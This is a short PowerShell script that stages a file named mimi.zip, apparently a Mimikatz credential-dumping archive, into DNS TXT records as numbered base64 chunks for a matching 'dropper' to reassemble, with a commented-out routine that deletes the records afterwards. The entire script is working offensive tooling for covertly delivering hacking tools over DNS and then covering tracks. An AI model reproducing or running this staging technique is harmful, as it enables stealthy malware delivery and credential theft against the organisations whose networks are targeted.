$file_id = "mimi1test" # must match file_id on the dropper side
$filename = "C:\Users\Administrator\Desktop\mimi.zip"

$ZoneName = "x.gt.wtf" # <-- use your own zone. 

$chunkSize = 180 # looks optimal, but you can test other values if you really want

$bytes = [System.IO.File]::ReadAllBytes($filename)

for ($i = 0; $i -lt ($bytes.Count / $chunkSize); $i++)
{
    $chunk = $bytes[($i * $chunkSize) .. ($i * $chunkSize + $chunkSize -1)]
    $base64String = [System.Convert]::ToBase64String($chunk)
    $recordName = $file_id + "-" + $i.ToString()+"-txt"
    Add-DnsServerResourceRecord -ZoneName $ZoneName -Name $recordName -DescriptiveText $base64String -Txt
}
$recordName = $file_id + "-" + $i.ToString()+"-txt"
Add-DnsServerResourceRecord -ZoneName $ZoneName -Name $recordName -DescriptiveText "====" -Txt #terminator


# automated removal for given file_id
<#

$file_id = "mimi1test"
$i = 0
while ($true)
{
    $recordName = $file_id + "-" + $i.ToString()+"-txt"
    $rr = Get-DnsServerResourceRecord -ZoneName $ZoneName -Name $recordName -ErrorAction SilentlyContinue
    if (!$rr)
    {
        break # no record, means cleanup finished.
    }
    $i++
    Remove-DnsServerResourceRecord -ZoneName $ZoneName -Name $recordName -RRType Txt -Force
}

#>

